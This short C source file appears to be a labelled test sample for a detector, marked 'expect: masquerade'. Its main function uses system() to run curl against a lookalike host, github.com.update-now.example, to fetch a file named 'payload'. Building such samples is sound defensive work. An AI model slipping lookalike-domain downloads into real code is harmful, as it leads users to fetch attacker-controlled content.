// level: hard
// mode: dynamic
// expect: masquerade
// what: a download is fetched from github.com.update-now.example, a host named so it looks like github.com
#include <stdlib.h>

int main(void) {
    system("curl -fsSL https://github.com.update-now.example/payload");
    return 0;
}
